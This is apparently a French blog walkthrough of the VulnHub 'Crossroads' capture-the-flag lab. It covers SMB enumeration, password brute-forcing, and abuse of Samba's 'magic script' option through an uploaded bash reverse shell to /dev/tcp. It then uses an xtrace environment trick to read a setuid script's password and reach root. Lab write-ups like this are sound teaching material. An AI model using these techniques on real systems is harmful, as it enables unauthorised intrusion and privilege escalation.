# Solution du CTF Crossroads de VulnHub

[Crossroads](https://vulnhub.com/entry/crossroads-1,659/) est un CTF de `VulnHub` qui ne fait pas partie de la série `DriftingBlues` déjà traité sur le blog mais qui est visiblement du même auteur.

A un moment on a du brute-force à effectuer malheureusement les outils existants ne fonctionnent pas forcément.

```
Nmap scan report for 192.168.56.111
Host is up (0.00038s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
80/tcp  open  http        Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: 12 Step Treatment Center | Crossroads Centre Antigua
| http-robots.txt: 1 disallowed entry 
|_/crossroads.png
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
MAC Address: 08:00:27:C7:51:22 (Oracle VirtualBox virtual NIC)
Service Info: Host: CROSSROADS

Host script results:
|_clock-skew: mean: 1h59m57s, deviation: 3h27m50s, median: -2s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: crossroads
|   NetBIOS computer name: CROSSROADS\x00
|   Domain name: \x00
|   FQDN: crossroads
|_  System time: 2023-02-19T13:38:22-06:00
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: CROSSROADS, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb2-time: 
|   date: 2023-02-19T19:38:22
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```

Pas de port SSH mais un SMB. Voyons ce qu'il y a comme partages :

```shellsession
$ smbclient -U "" -N -L //192.168.56.111

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        smbshare        Disk      
        IPC$            IPC       IPC Service (Samba 4.9.5-Debian)
SMB1 disabled -- no workgroup available
$ smbclient -U "" -N //192.168.56.111/smbshare
tree connect failed: NT_STATUS_ACCESS_DENIED
```

J'ai eu la bonne idée d'énumérer les utilisateurs du SMB ave `Nmap`. Ca évite une recherche supplémentaire (voir plus loin).

```shellsession
$ sudo nmap -sU -sS --script smb-enum-users.nse -p U:137,T:139 192.168.56.111
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-19 20:42 CET
Nmap scan report for 192.168.56.111
Host is up (0.00036s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
137/udp open  netbios-ns
MAC Address: 08:00:27:C7:51:22 (Oracle VirtualBox virtual NIC)

Host script results:
| smb-enum-users: 
|   CROSSROADS\albert (RID: 1001)
|     Full name:   
|     Description: 
|_    Flags:       Normal user account
```

## Do It Yourself

Il y a un utilisateur `albert`. J'ai lancé une attaque brute-force avec `Hydra 9.3` et la wordlist `rockyou` mais ça ne semblait pas de résultats donc j'ai laissé tomber.

J'ai essayé plus tard avec le script smb-brute de `Nmap` mais toujours sans succès :

```bash
nmap --script smb-brute.nse --script-args smbuser=albert,passdb=rockyou.txt -p445 192.168.56.111
```

Du coup j'ai fouillé sur le port 80 où on trouve ce qui semble être une copie de `crossroadsantigua.org`. Bien que la page mentionne un Wordpress, aucun des liens de fonctionne, c'est vraiment une bête copie de la page HTML avec les ressources (images, CSS).

J'ai procédé à une enumération web et j'ai trouvé un fichier `note.txt` avec la commande suivante :

```bash
feroxbuster -u http://192.168.56.111/ -w fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-words.txt -n -x php,html,txt,zip
```

Le contenu du fichier est le suivant :

> just find three kings of blues
> then move to the crossroads
> 
> -------------------------------
> 
> -abuzerkomurcu

Google nous informe :

> When blues guitarists talk about their idols, at least one of these three names is sure to crop up: **Albert King, B.B. King, or Freddie King** – the three kings of the Blues.

Bon, à priori pas grand chose que je ne sache déjà... Il s'agit ici d'`albert`.

J'ai décidé de n'utiliser ni `Nmap` ni `Hydra` mais le script de brute force SMB que j'avais déjà codé sur un cas similaire : [GitHub - devl00p/brute_smb_share: Brute force a SMB share](https://github.com/devl00p/brute_smb_share)

Et effectivement une fois de plus il fonctionne quand les autres ont échoués :

```shellsession
$ python3 brute_smb_share.py 192.168.56.111 smbshare users.txt /opt/hdd/downloads/tools/wordlists/rockyou.txt 
Success with user albert and password bradley1
        smb.conf
```

## It's a kind of magic

Le fichier mentionné est lisible et à la fin je trouve la configuration du partage :

```ini
[smbshare]

path = /home/albert/smbshare
valid users = albert
browsable = yes
writable = yes
read only = no
magic script = smbscript.sh
guest ok = no
```

D'après la page de manuelle [smb.conf](https://www.samba.org/samba/docs/current/man-html/smb.conf.5.html), l'entrée `magic script` permet de faire exécuter un script par le serveur Samba :

> This parameter specifies the name of a file which, if opened, will be executed by the server when the file is closed. This allows a UNIX script to be sent to the Samba host and executed on behalf of the connected user.
> 
> Scripts executed in this way will be deleted upon completion assuming that the user has the appropriate level of privilege and the file permissions allow the deletion.
> 
> If the script generates output, output will be sent to the file specified by the [magic output](https://www.samba.org/samba/docs/current/man-html/smb.conf.5.html#MAGICOUTPUT) parameter (see above).
> 
> Note that some shells are unable to interpret scripts containing CR/LF instead of CR as the end-of-line marker. Magic scripts must be executable *as is* on the host, which for some hosts and some shells will require filtering at the DOS end.
> 
> Magic scripts are *EXPERIMENTAL* and should *NOT* be relied upon.
> 
> Default: **`magic script`* =*
> 
> Example: **`magic script`* = `user.csh`*

On regardera ça tout à l'heure. Pour le moment je relance `smbclient` avec le mot de passe récupéré :

```shellsession
$ smbclient -U albert -L //192.168.56.111
Password for [WORKGROUP\albert]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        smbshare        Disk      
        IPC$            IPC       IPC Service (Samba 4.9.5-Debian)
        albert          Disk      Home Directories
SMB1 disabled -- no workgroup available
```

On trouve un ELF nommé `beroot` et l'image `crossroads.png` qui a le même nom que l'image présente sur le serveur web (voir l'entrée `robots.txt` mentionnée par le scan `Nmap`).

Bien que les deux images diffèrent je n'ai rien trouvé de valeur dans aucune des deux.

```shellsession
$ smbclient -U albert //192.168.56.111/albert
Password for [WORKGROUP\albert]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Mar  6 13:45:15 2021
  ..                                  D        0  Tue Mar  2 23:00:47 2021
  smbshare                            D        0  Tue Mar  2 23:16:13 2021
  crossroads.png                      N  1583196  Tue Mar  2 23:34:03 2021
  beroot                              N    16664  Wed Mar  3 00:02:41 2021
  user.txt                            N     1805  Sun Jan  3 18:56:19 2021

                4000320 blocks of size 1024. 3759668 blocks available
```

On peut télécharger et afficher notre premier flag :

```shellsession
$ cat user.txt 
flag 1/2
░░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄▄
░░░░░█░░░░░░░░░░░░░░░░░░▀▀▄
░░░░█░░░░░░░░░░░░░░░░░░░░░░█
░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█
░▄▀░▄▄▄░░█▀▀▀▀▄▄█░░░██▄▄█░░░░█
█░░█░▄░▀▄▄▄▀░░░░░░░░█░░░░░░░░░█
█░░█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄░█
░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█
░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█
░░░█░░░░██░░▀█▄▄▄█▄▄█▄▄██▄░░█
░░░░█░░░░▀▀▄░█░░░█░█▀█▀█▀██░█
░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█
░░░░░░░▀▄▄░░░░░░░░░░░░░░░░░░░█
░░░░░█░░░░▀▀▄▄░░░░░░░░░░░░░░░█
░░░░▐▌░░░░░░█░▀▄▄▄▄▄░░░░░░░░█
░░███░░░░░▄▄█░▄▄░██▄▄▄▄▄▄▄▄▀
░▐████░░▄▀█▀█▄▄▄▄▄█▀▄▀▄
░░█░░▌░█░░░▀▄░█▀█░▄▀░░░█
░░█░░▌░█░░█░░█░░░█░░█░░█
░░█░░▀▀░░██░░█░░░█░░█░░█
░░░▀▀▄▄▀▀░█░░░▀▄▀▀▀▀█░░█

```

Maintenant passons à ce `magic script`. J'ai créé le script suivant :

```bash
#!/bin/bash
bash -i >& /dev/tcp/192.168.56.1/9999 0>&1
```

Et dès que l'on lance l'upload du fichier :

```shellsession
$ smbclient -U albert //192.168.56.111/smbshare
Password for [WORKGROUP\albert]:
Try "help" to get a list of possible commands.
smb: \> put smbscript.sh
```

Le script est exécuté et me donne un reverse shell :

```shellsession
$ ncat -l -p 9999 -v
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9999
Ncat: Listening on 0.0.0.0:9999
Ncat: Connection from 192.168.56.111.
Ncat: Connection from 192.168.56.111:53100.
bash: cannot set terminal process group (483): Inappropriate ioctl for device
bash: no job control in this shell
albert@crossroads:/home/albert/smbshare$ id
id
uid=1000(albert) gid=1000(albert) groups=1000(albert)
```

## Just debug it

Le binaire `beroot` vu plus tôt est setuid root :

```
-rwsr-xr-x 1 root   root    17K Mar  2  2021 beroot
```

Il est très basique comme le montre le code C décompilé par `Cutter` :

```c
/* jsdec pseudo code output */
/* /tmp/beroot @ 0x1145 */
#include <stdint.h>
 
int32_t main (void) {
    edi = 0;
    eax = 0;
    setuid ();
    rdi = "/bin/bash /root/beroot.sh";
    eax = 0;
    system ();
    eax = 0;
    return eax;
}
```

Mais rien ne semble vulnérable : les paths sont absolus et il n'y a pas de `strcpy`...

Bien sûr le script bash mentionné ne nous est pas non plus accessible. On peut seulement se faire une idée à l'exécution :

```shellsession
albert@crossroads:/home/albert$ ./beroot
enter password for root
-----------------------

password: yolo
wrong password!!!
```

Heureusemet on peut faire passer une variable d'environnement pour tracer l'exécution du script ce qui a pour effet de voir les commandes exécutées :

```shellsession
albert@crossroads:/home/albert$ env -i SHELLOPTS=xtrace ./beroot 
+ /usr/bin/clear
TERM environment variable not set.
+ /usr/bin/echo 'enter password for root'
enter password for root
+ /usr/bin/echo -----------------------
-----------------------
+ /usr/bin/echo ''

+ read -p 'password: ' pasw
password: yolo
++ /usr/bin/ls /root/passwd
+ [[ yolo == \l\e\m\u\e\l ]]
+ /usr/bin/echo 'wrong password!!!'
wrong password!!!
```

On voit que le mot de passe attendu est `lemuel`. C'est parti :

```shellsession
albert@crossroads:/home/albert$ ./beroot
enter password for root
-----------------------

password: lemuel
do ls and find root creds
```

Un fichier a en effet fait son apparition :

```shellsession
albert@crossroads:/home/albert$ cat rootcreds 
root
___drifting___
albert@crossroads:/home/albert$ su root
Password: 
root@crossroads:/home/albert# id
uid=0(root) gid=0(root) groups=0(root)
root@crossroads:/home/albert# cd /root
root@crossroads:~# ls
beroot.sh  creds  passwd  root.txt
root@crossroads:~# cat root.txt 
flag 2/2
░░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄▄
░░░░░█░░░░░░░░░░░░░░░░░░▀▀▄
░░░░█░░░░░░░░░░░░░░░░░░░░░░█
░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█
░▄▀░▄▄▄░░█▀▀▀▀▄▄█░░░██▄▄█░░░░█
█░░█░▄░▀▄▄▄▀░░░░░░░░█░░░░░░░░░█
█░░█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄░█
░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█
░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█
░░░█░░░░██░░▀█▄▄▄█▄▄█▄▄██▄░░█
░░░░█░░░░▀▀▄░█░░░█░█▀█▀█▀██░█
░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█
░░░░░░░▀▄▄░░░░░░░░░░░░░░░░░░░█
░░▐▌░█░░░░▀▀▄▄░░░░░░░░░░░░░░░█
░░░█▐▌░░░░░░█░▀▄▄▄▄▄░░░░░░░░█
░░███░░░░░▄▄█░▄▄░██▄▄▄▄▄▄▄▄▀
░▐████░░▄▀█▀█▄▄▄▄▄█▀▄▀▄
░░█░░▌░█░░░▀▄░█▀█░▄▀░░░█
░░█░░▌░█░░█░░█░░░█░░█░░█
░░█░░▀▀░░██░░█░░░█░░█░░█
░░░▀▀▄▄▀▀░█░░░▀▄▀▀▀▀█░░█

congratulations!
```

Voici le script bash qui demandait le mot de passe :

```bash
#!/bin/bash

/usr/bin/clear
/usr/bin/echo "enter password for root"
/usr/bin/echo "-----------------------"
/usr/bin/echo ""
read -p "password: " pasw

if [[ "$pasw" == "$(/usr/bin/ls /root/passwd)" ]]; then
        /usr/bin/cat /root/creds > /home/albert/rootcreds
        /usr/bin/echo "do ls and find root creds"
else
        /usr/bin/echo "wrong password!!!"
fi
```

*Publié le 19 février 2023*
